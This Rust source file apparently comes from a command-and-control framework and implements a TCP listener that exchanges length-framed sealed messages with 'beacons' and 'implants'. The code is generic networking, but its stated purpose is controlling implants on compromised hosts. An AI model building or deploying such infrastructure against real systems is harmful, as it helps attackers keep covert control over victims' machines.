use crate::channels::process_sealed;
use crate::server::ServerState;

const MAX_FRAME: usize = 8 * 1024 * 1024;

/// Raw length-framed TCP C2 listener, sharing the same sealed-envelope dispatch
/// as HTTP. Each beacon exchange is one `[u32 BE len][sealed bytes]` frame in,
/// one frame out, over its own connection.
pub async fn serve_tcp(state: ServerState, bind: String) -> anyhow::Result<()> {
    let listener = tokio::net::TcpListener::bind(&bind).await?;
    tracing::info!(bind, "c2 raw-tcp listener up");
    loop {
        let (mut sock, peer) = listener.accept().await?;
        let st = state.clone();
        tokio::spawn(async move {
            if let Err(e) = handle_conn(&mut sock, &st).await {
                tracing::debug!(%peer, "tcp conn: {e}");
            }
        });
    }
}

async fn handle_conn(sock: &mut tokio::net::TcpStream, state: &ServerState) -> anyhow::Result<()> {
    use tokio::io::AsyncWriteExt;

    let sealed = read_frame(sock).await?;
    let reply = match process_sealed(state, &sealed) {
        Ok(rep) => rep,
        Err(e) => {
            // Empty reply so the implant-side read doesn't hang on an error.
            tracing::warn!("tcp dispatch error: {e:?}");
            Vec::new()
        }
    };
    let frame = frame_bytes(&reply);
    sock.write_all(&frame).await?;
    sock.flush().await?;
    Ok(())
}

async fn read_frame(sock: &mut tokio::net::TcpStream) -> anyhow::Result<Vec<u8>> {
    use tokio::io::AsyncReadExt;
    let mut len_buf = [0u8; 4];
    sock.read_exact(&mut len_buf).await?;
    let len = u32::from_be_bytes(len_buf) as usize;
    if len > MAX_FRAME {
        anyhow::bail!("frame too large ({len})");
    }
    let mut body = vec![0u8; len];
    sock.read_exact(&mut body).await?;
    Ok(body)
}

fn frame_bytes(body: &[u8]) -> Vec<u8> {
    let mut f = Vec::with_capacity(4 + body.len());
    f.extend_from_slice(&(body.len() as u32).to_be_bytes());
    f.extend_from_slice(body);
    f
}
